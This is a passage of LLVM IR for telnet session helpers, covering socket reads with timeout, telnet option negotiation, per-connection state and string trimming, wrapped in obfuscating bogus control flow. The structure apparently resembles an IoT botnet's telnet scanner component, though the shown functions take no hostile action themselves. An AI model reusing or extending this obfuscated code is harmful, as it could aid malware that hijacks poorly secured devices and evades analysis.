  store i64 %54, i64* %52, align 8
  %55 = load i32, i32* %6, align 4
  %56 = add nsw i32 %55, 1
  %57 = call i32 @select(i32 %56, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %58 = icmp slt i32 %57, 1
  br i1 %58, label %59, label %60

; <label>:59:                                     ; preds = %43
  store i32 0, i32* %5, align 4
  br label %83

; <label>:60:                                     ; preds = %43
  %61 = load i32, i32* @x.15
  %62 = load i32, i32* @y.16
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  %69 = load i32, i32* %6, align 4
  %70 = load i8*, i8** %8, align 8
  %71 = load i32, i32* %9, align 4
  %72 = sext i32 %71 to i64
  %73 = call i64 @recv(i32 %69, i8* %70, i64 %72, i32 0)
  %74 = trunc i64 %73 to i32
  store i32 %74, i32* %5, align 4
  %75 = load i32, i32* @x.15
  %76 = load i32, i32* @y.16
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %83

; <label>:83:                                     ; preds = %originalBBpart24, %59
  %84 = load i32, i32* @x.15
  %85 = load i32, i32* @y.16
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %83
  %92 = load i32, i32* %5, align 4
  %93 = load i32, i32* @x.15
  %94 = load i32, i32* @y.16
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %92

originalBBalteredBB:                              ; preds = %originalBB, %18
  %101 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %102 = getelementptr inbounds [16 x i64], [16 x i64]* %101, i64 0, i64 0
  %103 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %102) #5, !srcloc !1
  %104 = extractvalue { i64, i64* } %103, 0
  %105 = extractvalue { i64, i64* } %103, 1
  %106 = trunc i64 %104 to i32
  store i32 %106, i32* %12, align 4
  %107 = ptrtoint i64* %105 to i64
  %108 = trunc i64 %107 to i32
  store i32 %108, i32* %13, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  %109 = load i32, i32* %6, align 4
  %110 = load i8*, i8** %8, align 8
  %111 = load i32, i32* %9, align 4
  %112 = sext i32 %111 to i64
  %113 = call i64 @recv(i32 %109, i8* %110, i64 %112, i32 0)
  %114 = trunc i64 %113 to i32
  store i32 %114, i32* %5, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %83
  %115 = load i32, i32* %5, align 4
  br label %originalBB6
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = load i32, i32* @x.17
  %7 = load i32, i32* @y.18
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %15, align 4
  store i32 %1, i32* %16, align 4
  store i8* %2, i8** %17, align 8
  store i32 %3, i32* %18, align 4
  store i8** %4, i8*** %19, align 8
  %22 = load i8*, i8** %17, align 8
  %23 = load i32, i32* %18, align 4
  %24 = sext i32 %23 to i64
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 %24, i32 1, i1 false)
  %25 = load i32, i32* %15, align 4
  %26 = load i32, i32* %16, align 4
  %27 = load i8*, i8** %17, align 8
  %28 = load i32, i32* %18, align 4
  %29 = call i32 @read_with_timeout(i32 %25, i32 %26, i8* %27, i32 %28)
  store i32 %29, i32* %20, align 4
  %30 = load i8*, i8** %17, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 0
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 255
  %35 = load i32, i32* @x.17
  %36 = load i32, i32* @y.18
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %63

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* @x.17
  %45 = load i32, i32* @y.18
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i32, i32* %15, align 4
  %53 = load i8*, i8** %17, align 8
  %54 = call i32 @negotiate(i32 %52, i8* %53, i32 3)
  %55 = load i32, i32* @x.17
  %56 = load i32, i32* @y.18
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %63

; <label>:63:                                     ; preds = %originalBBpart24, %originalBBpart2
  %64 = load i32, i32* @x.17
  %65 = load i32, i32* @y.18
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %63
  %72 = load i8*, i8** %17, align 8
  %73 = load i8**, i8*** %19, align 8
  %74 = call i32 @contains_string(i8* %72, i8** %73)
  %75 = icmp ne i32 %74, 0
  %76 = load i32, i32* @x.17
  %77 = load i32, i32* @y.18
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %84, label %85

; <label>:84:                                     ; preds = %originalBBpart28
  store i32 1, i32* %14, align 4
  br label %102

; <label>:85:                                     ; preds = %originalBBpart28
  %86 = load i32, i32* @x.17
  %87 = load i32, i32* @y.18
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %85
  store i32 0, i32* %14, align 4
  %94 = load i32, i32* @x.17
  %95 = load i32, i32* @y.18
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %102

; <label>:102:                                    ; preds = %originalBBpart212, %84
  %103 = load i32, i32* @x.17
  %104 = load i32, i32* @y.18
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %102
  %111 = load i32, i32* %14, align 4
  %112 = load i32, i32* @x.17
  %113 = load i32, i32* @y.18
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret i32 %111

originalBBalteredBB:                              ; preds = %originalBB, %5
  %120 = alloca i32, align 4
  %121 = alloca i32, align 4
  %122 = alloca i32, align 4
  %123 = alloca i8*, align 8
  %124 = alloca i32, align 4
  %125 = alloca i8**, align 8
  %126 = alloca i32, align 4
  %127 = alloca i32, align 4
  store i32 %0, i32* %121, align 4
  store i32 %1, i32* %122, align 4
  store i8* %2, i8** %123, align 8
  store i32 %3, i32* %124, align 4
  store i8** %4, i8*** %125, align 8
  %128 = load i8*, i8** %123, align 8
  %129 = load i32, i32* %124, align 4
  %130 = sext i32 %129 to i64
  call void @llvm.memset.p0i8.i64(i8* %128, i8 0, i64 %130, i32 1, i1 false)
  %131 = load i32, i32* %121, align 4
  %132 = load i32, i32* %122, align 4
  %133 = load i8*, i8** %123, align 8
  %134 = load i32, i32* %124, align 4
  %135 = call i32 @read_with_timeout(i32 %131, i32 %132, i8* %133, i32 %134)
  store i32 %135, i32* %126, align 4
  %136 = load i8*, i8** %123, align 8
  %137 = getelementptr inbounds i8, i8* %136, i64 0
  %138 = load i8, i8* %137, align 1
  %139 = sext i8 %138 to i32
  %140 = icmp eq i32 %139, 255
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %141 = load i32, i32* %15, align 4
  %142 = load i8*, i8** %17, align 8
  %143 = call i32 @negotiate(i32 %141, i8* %142, i32 3)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %63
  %144 = load i8*, i8** %17, align 8
  %145 = load i8**, i8*** %19, align 8
  %146 = call i32 @contains_string(i8* %144, i8** %145)
  %147 = icmp ne i32 %146, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %85
  store i32 0, i32* %14, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %102
  %148 = load i32, i32* %14, align 4
  br label %originalBB14
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %93 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %95

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %86

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %46

; <label>:29:                                     ; preds = %23
  %30 = load i32, i32* @x.19
  %31 = load i32, i32* @y.20
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  store i8 -4, i8* %8, align 1
  %38 = load i32, i32* @x.19
  %39 = load i32, i32* @y.20
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %85

; <label>:46:                                     ; preds = %23
  %47 = load i8*, i8** %6, align 8
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 3, %50
  br i1 %51, label %52, label %60

; <label>:52:                                     ; preds = %46
  %53 = load i8*, i8** %6, align 8
  %54 = getelementptr inbounds i8, i8* %53, i64 1
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 253
  %58 = select i1 %57, i32 251, i32 253
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %8, align 1
  br label %68

; <label>:60:                                     ; preds = %46
  %61 = load i8*, i8** %6, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 1
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 253
  %66 = select i1 %65, i32 252, i32 254
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %8, align 1
  br label %68

; <label>:68:                                     ; preds = %60, %52
  %69 = load i32, i32* @x.19
  %70 = load i32, i32* @y.20
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %68
  %77 = load i32, i32* @x.19
  %78 = load i32, i32* @y.20
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %85

; <label>:85:                                     ; preds = %originalBBpart24, %originalBBpart2
  br label %86

; <label>:86:                                     ; preds = %85, %22
  %87 = load i32, i32* %5, align 4
  %88 = call i64 @send(i32 %87, i8* %8, i64 1, i32 16384)
  %89 = load i32, i32* %5, align 4
  %90 = load i8*, i8** %6, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 2
  %92 = call i64 @send(i32 %89, i8* %91, i64 1, i32 16384)
  br label %94

; <label>:93:                                     ; preds = %3
  br label %94

; <label>:94:                                     ; preds = %93, %86
  store i32 0, i32* %4, align 4
  br label %95

; <label>:95:                                     ; preds = %94, %13
  %96 = load i32, i32* @x.19
  %97 = load i32, i32* @y.20
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %95
  %104 = load i32, i32* %4, align 4
  %105 = load i32, i32* @x.19
  %106 = load i32, i32* @y.20
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %104

originalBBalteredBB:                              ; preds = %originalBB, %29
  store i8 -4, i8* %8, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %68
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %95
  %113 = load i32, i32* %4, align 4
  br label %originalBB6
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 2
  %6 = load i32, i32* %5, align 8
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 9
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 3
  store i8 %16, i8* %18, align 4
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 11
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 4
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = load i32, i32* @x.27
  %3 = load i32, i32* @y.28
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %10, align 8
  store i32 0, i32* %12, align 4
  %14 = load i8*, i8** %10, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = sub i64 %15, 1
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %13, align 4
  %18 = load i32, i32* @x.27
  %19 = load i32, i32* @y.28
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %35, %originalBBpart2
  %27 = load i8*, i8** %10, align 8
  %28 = load i32, i32* %12, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = call i32 @isspace(i32 %32) #9
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %26
  %36 = load i32, i32* %12, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %12, align 4
  br label %26

; <label>:38:                                     ; preds = %26
  br label %39

; <label>:39:                                     ; preds = %70, %38
  %40 = load i32, i32* %13, align 4
  %41 = load i32, i32* %12, align 4
  %42 = icmp sge i32 %40, %41
  br i1 %42, label %43, label %52

; <label>:43:                                     ; preds = %39
  %44 = load i8*, i8** %10, align 8
  %45 = load i32, i32* %13, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = call i32 @isspace(i32 %49) #9
  %51 = icmp ne i32 %50, 0
  br label %52

; <label>:52:                                     ; preds = %43, %39
  %53 = phi i1 [ false, %39 ], [ %51, %43 ]
  %54 = load i32, i32* @x.27
  %55 = load i32, i32* @y.28
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %52
  %62 = load i32, i32* @x.27
  %63 = load i32, i32* @y.28
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br i1 %53, label %70, label %73

; <label>:70:                                     ; preds = %originalBBpart29
  %71 = load i32, i32* %13, align 4
  %72 = add nsw i32 %71, -1
  store i32 %72, i32* %13, align 4
  br label %39

; <label>:73:                                     ; preds = %originalBBpart29
  %74 = load i32, i32* %12, align 4
  store i32 %74, i32* %11, align 4
  br label %75

; <label>:75:                                     ; preds = %originalBBpart215, %73
  %76 = load i32, i32* %11, align 4
  %77 = load i32, i32* %13, align 4
  %78 = icmp sle i32 %76, %77
  br i1 %78, label %79, label %110

; <label>:79:                                     ; preds = %75
  %80 = load i8*, i8** %10, align 8
  %81 = load i32, i32* %11, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = load i8, i8* %83, align 1
  %85 = load i8*, i8** %10, align 8
  %86 = load i32, i32* %11, align 4
  %87 = load i32, i32* %12, align 4
  %88 = sub nsw i32 %86, %87
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %85, i64 %89
  store i8 %84, i8* %90, align 1
  br label %91

; <label>:91:                                     ; preds = %79
  %92 = load i32, i32* @x.27
  %93 = load i32, i32* @y.28
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %91
  %100 = load i32, i32* %11, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %11, align 4
  %102 = load i32, i32* @x.27
  %103 = load i32, i32* @y.28
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart215, label %originalBB11alteredBB

originalBBpart215:                                ; preds = %originalBB11
  br label %75

; <label>:110:                                    ; preds = %75
  %111 = load i8*, i8** %10, align 8
  %112 = load i32, i32* %11, align 4
  %113 = load i32, i32* %12, align 4
  %114 = sub nsw i32 %112, %113
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %111, i64 %115
  store i8 0, i8* %116, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %117 = alloca i8*, align 8
  %118 = alloca i32, align 4
  %119 = alloca i32, align 4
  %120 = alloca i32, align 4
  store i8* %0, i8** %117, align 8
  store i32 0, i32* %119, align 4
  %121 = load i8*, i8** %117, align 8
  %122 = call i64 @strlen(i8* %121) #9
  %_ = sub i64 0, %122
  %gen = add i64 %_, 1
  %_1 = sub i64 %122, 1
  %gen2 = mul i64 %_1, 1
  %_3 = sub i64 0, %122
  %gen4 = add i64 %_3, 1
  %_5 = sub i64 %122, 1
  %gen6 = mul i64 %_5, 1
  %123 = sub i64 %122, 1
  %124 = trunc i64 %123 to i32
  store i32 %124, i32* %120, align 4
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %52
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %91
  %125 = load i32, i32* %11, align 4
  %_12 = sub i32 %125, 1
  %gen13 = mul i32 %_12, 1
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %11, align 4
  br label %originalBB11
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %571, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %574

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %546

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %574

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %547

; <label>:36:                                     ; preds = %30
  %37 = load i32, i32* @x.31
  %38 = load i32, i32* @y.32
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
